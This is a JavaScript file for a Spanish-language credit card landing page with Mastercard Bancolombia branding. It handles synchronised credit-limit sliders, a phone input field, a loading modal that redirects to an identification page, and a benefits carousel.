/**
 * assets/javascript/index.js
 * --------------------------
 * Controla la landing principal (index.html - presentación del producto crédito).
 *
 * Contenido:
 *   1) Sliders DUALES: superior (5M-70M) + inferior (5M-80M) siempre SINCRONIZADOS.
 *   2) 10 botones de cupo predefinido, actualizan ambos sliders + recuadro punteado.
 *   3) Modal de 3s + redirect a la pantalla de identificación (identification.html).
 *      Parámetros: cupo (raw), monto_texto (formateado COP), opcionalmente celular.
 *   4) Botones que disparan el flujo: "SOLICITAR TARJETA" (arriba) y "Entrar" (abajo).
 *   5) Carrusel de beneficios con los 4 grupos de tarjetas Mastercard + prev/next.
 */

// ── Estado global compartido ──────────────────────────────────────────────────
var cupoActualRaw = 15000000; // valor inicial slider superior

function fmtCupoCOP(raw) {
  var n = parseInt(raw, 10) || 0;
  return "$" + n.toLocaleString("es-CO");
}

// ── 1) Sliders duales sincronizados ──────────────────────────────────────────
var rangeTop    = document.getElementById("cupoRange");
var rangeBottom = document.getElementById("cupoRangeBottom");
var cupoValueTop    = document.getElementById("cupoValue");
var cupoValueBottom = document.getElementById("cupoValueBottom");

function actualizarVisualCupo() {
  var vRaw = parseInt(cupoActualRaw, 10) || 5000000;
  var fmt  = fmtCupoCOP(vRaw);

  // Cupo value en la sección superior (antes lo hacía updateRange)
  if (cupoValueTop)    cupoValueTop.textContent    = fmt;
  // Cupo value en el recuadro punteado inferior (imagen 2)
  if (cupoValueBottom) cupoValueBottom.textContent = fmt;

  // Slider superior (progress Amarillo via CSS var --progress)
  if (rangeTop) {
    var p1 = 0;
    if (rangeTop.max && rangeTop.min) {
      p1 = ((vRaw - parseInt(rangeTop.min,10)) / (parseInt(rangeTop.max,10) - parseInt(rangeTop.min,10))) * 100;
      if (p1 < 0) p1 = 0; if (p1 > 100) p1 = 100;
    }
    rangeTop.style.setProperty("--progress", p1 + "%");
    // clamp a rango superior max=70M
    var vTop = vRaw;
    if (vTop > parseInt(rangeTop.max,10)) vTop = parseInt(rangeTop.max,10);
    if (vTop < parseInt(rangeTop.min,10)) vTop = parseInt(rangeTop.min,10);
    if (parseInt(rangeTop.value,10) !== vTop) rangeTop.value = String(vTop);
  }

  // Slider inferior (progress2 Amarillo via CSS var --progress2)
  if (rangeBottom) {
    var p2 = 0;
    if (rangeBottom.max && rangeBottom.min) {
      p2 = ((vRaw - parseInt(rangeBottom.min,10)) / (parseInt(rangeBottom.max,10) - parseInt(rangeBottom.min,10))) * 100;
      if (p2 < 0) p2 = 0; if (p2 > 100) p2 = 100;
    }
    rangeBottom.style.setProperty("--progress2", p2 + "%");
    var vBot = vRaw;
    if (vBot > parseInt(rangeBottom.max,10)) vBot = parseInt(rangeBottom.max,10);
    if (vBot < parseInt(rangeBottom.min,10)) vBot = parseInt(rangeBottom.min,10);
    if (parseInt(rangeBottom.value,10) !== vBot) rangeBottom.value = String(vBot);
  }

  // Resaltar botón cupo-grid seleccionado (si coincide valor exacto)
  var buttons = document.querySelectorAll(".cupo-btn");
  buttons.forEach(function (btn) {
    var bc = parseInt(btn.getAttribute("data-cupo"), 10) || 0;
    if (bc === vRaw) btn.classList.add("selected");
    else btn.classList.remove("selected");
  });
}

if (rangeTop) {
  rangeTop.addEventListener("input", function () {
    cupoActualRaw = parseInt(rangeTop.value, 10) || 5000000;
    actualizarVisualCupo();
  });
}
if (rangeBottom) {
  rangeBottom.addEventListener("input", function () {
    cupoActualRaw = parseInt(rangeBottom.value, 10) || 5000000;
    actualizarVisualCupo();
  });
}

// ── 2) Botones grid de cupo predefinido ───────────────────────────────────────
var gridBtns = document.querySelectorAll(".cupo-btn");
gridBtns.forEach(function (btn) {
  btn.addEventListener("click", function () {
    var v = parseInt(btn.getAttribute("data-cupo"), 10) || 5000000;
    cupoActualRaw = v;
    actualizarVisualCupo();
  });
});

// Inicializar visuales (equivalente a updateRange() legacy)
actualizarVisualCupo();

// ── 3) Campo teléfono ────────────────────────────────────────────────────────
var inputTel = document.getElementById("inputTelefono");
if (inputTel) {
  inputTel.addEventListener("input", function () {
    var limpio = inputTel.value.replace(/\D/g, "").slice(0, 10);
    inputTel.value = limpio;
    if (limpio.length >= 7) inputTel.classList.add("filled");
    else inputTel.classList.remove("filled");
  });
}

// ── 4) Modal de carga + redirect identificación ──────────────────────────────
function showLoadingModalAndRedirect() {
  var modalContainer = document.querySelector(".modal-container");
  modalContainer.style.display = "flex";
  setTimeout(function () {
    modalContainer.style.display = "none";

    var cupoRaw    = String(cupoActualRaw || "");
    var cupoFmt    = fmtCupoCOP(cupoRaw);
    var celularRaw = (inputTel && inputTel.value) ? String(inputTel.value).replace(/\D/g, "") : "";

    var qs = new URLSearchParams();
    if (cupoRaw)  qs.set("cupo", cupoRaw);
    if (cupoFmt)  qs.set("monto_texto", cupoFmt);
    if (celularRaw.length === 10) qs.set("celular", celularRaw);
    window.location.href = "identification.html" + (qs.toString() ? ("?" + qs.toString()) : "");
  }, 3000);
}

// Ambos botones disparan mismo flujo
var btnSolicitar = document.getElementById("solicitarTarjetaButton");
if (btnSolicitar) btnSolicitar.addEventListener("click", showLoadingModalAndRedirect);

var btnEntrar = document.getElementById("btnEntrar");
if (btnEntrar) btnEntrar.addEventListener("click", showLoadingModalAndRedirect);

// ── 5) Tabs visuales (Tarjeta / Libre Inversión) ──────────────────────────────
var tabs = document.querySelectorAll(".tab-pill");
tabs.forEach(function (t) {
  t.addEventListener("click", function () {
    tabs.forEach(function (x) { x.classList.remove("active"); });
    t.classList.add("active");
  });
});

// ── 6) Carrusel de beneficios Mastercard (4 grupos de paneles) ────────────────
function changeCarouselItem() {
  var carouselContainer = document.getElementById("carouselContainer");
  // Carrusel legacy solo se activa si el container sigue existiendo en index.html
  if (!carouselContainer) return;

  var indicators        = document.querySelectorAll(".indicators span");
  var prevButton        = document.getElementById("prevButton");
  var nextButton        = document.getElementById("nextButton");
  var img1              = document.querySelector("#carouselItem1 img");
  var img2              = document.querySelector("#carouselItem2 img");
  var carouselTitle1    = document.querySelector("#carouselItem1 .carousel-text h3");
  var carouselTitle2    = document.querySelector("#carouselItem2 .carousel-text h3");
  var carouselText1     = document.querySelector("#carouselItem1 .carousel-text p");
  var carouselText2     = document.querySelector("#carouselItem2 .carousel-text p");

  var currentIndex = 0;

  function updateCarousel() {
    switch (currentIndex) {
      case 0:
        img1.src = "./assets/svgs/icono-estrella.svg";
        carouselTitle1.textContent = "Mastercard Airport Experiences";
        carouselText1.textContent  = "Acceso a más de 1.600 salas VIP con el programa Mastercard Experiences.";
        img2.src = "./assets/svgs/icono-viaje.svg";
        carouselTitle2.textContent = "Cobertura en viajes";
        carouselText2.textContent  = "En caso de accidente o enfermedad cubrimos los gastos médicos para ti y tus beneficiarios.";
        break;
      case 1:
        img1.src = "./assets/svgs/icono-caja.svg";
        carouselTitle1.textContent = "Casillero virtual";
        carouselText1.textContent  = "Compra por Internet en Estados Unidos y recibe tus articulos en Colombia.";
        img2.src = "./assets/images/pago-alegre.png";
        carouselTitle2.textContent = "Paga con Mastercard";
        carouselText2.textContent  = "Disfruta de beneficios exclusivos para tu dia a dia pagando con tus tarjetas Mastercard Bancolombia.";
        break;
      case 2:
        img1.src = "./assets/svgs/diamantito.svg";
        carouselTitle1.textContent = "Salas VIP Avianca";
        carouselText1.textContent  = "Presenta tu tarjeta de credito y accede a las salas VIP de Avianca en Colombia.";
        img2.src = "./assets/svgs/icono-auto.svg";
        carouselTitle2.textContent = "La mejor forma de viajar";
        carouselText2.textContent  = "Accede a un asistente personal para coordinar itinerario, reservas y alquiler de vehiculos.";
        break;
      default: // case 3
        img1.src = "./assets/svgs/calendario.svg";
        carouselTitle1.textContent = "Afiliacion de pagos";
        carouselText1.textContent  = "Cambia tu tarjeta vencida o danada y tus datos se actualizaran para pagos de suscripciones.";
        img2.src = "./assets/images/icono-casa.png";
        carouselTitle2.textContent = "Dale un nuevo aire a tu hogar";
        carouselText2.textContent  = "Todos los jueves disfruta hasta el 20% de descuento en Alfa. Paga con tu tarjeta de credito Mastercard y usa el codigo ALFAMASTERCARD.";
    }
  }

  function updateIndicators() {
    indicators.forEach(function (indicator, index) {
      indicator.classList.toggle("active", index === currentIndex);
    });
  }

  function nextCarouselItem() {
    currentIndex = (currentIndex + 1) % 4;
    updateCarousel();
    updateIndicators();
  }
  function prevCarouselItem() {
    currentIndex = (currentIndex - 1 + 4) % 4;
    updateCarousel();
    updateIndicators();
  }

  if (nextButton) nextButton.addEventListener("click", nextCarouselItem);
  if (prevButton) prevButton.addEventListener("click", prevCarouselItem);

  updateCarousel();
  updateIndicators();
}

changeCarouselItem();
